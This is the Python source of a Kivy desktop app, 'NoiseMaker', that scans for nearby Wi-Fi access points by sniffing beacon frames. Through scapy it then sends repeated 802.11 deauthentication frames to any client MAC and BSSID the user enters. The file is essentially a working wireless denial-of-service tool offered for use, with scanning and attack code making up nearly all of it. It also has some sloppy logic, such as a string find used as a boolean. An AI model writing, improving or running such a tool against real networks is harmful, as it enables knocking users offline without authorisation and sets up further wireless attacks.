#Imports for deauthentication and scanning
import sys
from scapy.all import *
from dns.rdatatype import NULL

#Imports for kivy
import kivy
kivy.require("1.9.0")
from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.config import Config
from kivy.clock import Clock
from kivy.core.text import LabelBase

#Set Window size
Config.set('graphics','height','500')                       # Set height to 500
Config.set('graphics','width','1000')                       # Set width to 1000
Config.set('graphics','resizable','0')                      # Does not allow to set height and width by user
Config.set('input','mouse','mouse,disable_multitouch')      # Disables kivy's multitouch simulation in the app

#Adding a font to kivy for the outputs
KIVY_FONTS = [
    {
        "name": "Consola",
        "fn_regular": "data/fonts/consola.ttf",
    }
]
    
for font in KIVY_FONTS:
    LabelBase.register(**font)

# Class that contains all the functionality of the application
class NoiseMakerFunc(FloatLayout):

# This function will send the deauthentication packet and print to the program
    def outputPacket(self, nssid, sendiface, client, packet):
        self.ids.resultOutput.text += 'Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
        sendp(packet)                                       # Sends the deauthentication packet
        return        

# This function will define the deauthentication packet and refer to the send function    
    def SendPacket (self):  
        try:
            client = str(self.ids.target.text)              # Takes the input from the target field (Client)
            nssid = str(self.ids.ssid.text)                 # Takes the input from the ssid field (BSSID)
            count = self.ids.decount.text                   # Takes the input from the decount field (Count)
            conf.iface = str(self.ids.iface.text)           # Takes the input from the iface field (Interface) 
            sendiface = conf.iface                          # Takes the input from the iface field and makes it into a usable variable
            conf.verb = 0                                   # Set scapy to be not verbose
            packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=nssid,addr3=nssid)/Dot11Deauth(reason=7) # creates the packet to be send
            for n in range(int(count)):
                try:
                    Clock.schedule_once(self.outputPacket(nssid,sendiface,client,packet))   # Runs outputPacket function using the Kivy Clock function
                except Exception, d:
                    print d
        except Exception, c:
            self.ids.resultOutput.text = "Error" + "\n"     # Return Error to the 
            print c
            

    def ScanTarget (self):
        intface = str(self.ids.scaniface.text)
        amount = int(self.ids.scanamount.text) #amount of packages that will be listened to before 
        target = {}
    
    #sniff(iface=intface, prn=lambda x:x.sprintf("{Dot11Beacon:%Dot11.addr3%:%Dot11Beacon.info%}"), count=1) #Returns the following: FF:FF:FF:FF:FF:FF <ESSID>
        try:
            print "Scanning..."
            self.ids.targetOutput.text = "Scanning..."
            a = sniff(iface=intface, count=amount) # Stores all the captured information in a. a.addrx for dest and source
        except socket.error, e:
            print "Error, interface does not exist. " + str(e)
            self.ids.targetOutput.text = "Error, interface does not exist. " + str(e)
            return 1    
        for b in a:
            if str(b.summary()).find("Dot11Beacon") and not str(b.addr2) == "None": #Only process the current package if it is a beacon. Also, apparently find tends to just fail at its job.
                try:
                    if str(b.payload.payload.info) is not "":
                        target[b.addr2] = b.payload.payload.info
                except AttributeError, e: #Package was incorrect or no beacon. Removing item from dictionary.
                    print "Corrupt package caught. Skipping."
        d = ""
        for c in target:
            d += c + ":" + target[c] + "\n"
        self.ids.targetOutput.text = d
        return target
                
# Class that builds the NoiseMaker app
class NoiseMakerApp(App):

    def build(self):
        return NoiseMakerFunc()
    
NoiseMaker = NoiseMakerApp()
NoiseMaker.run()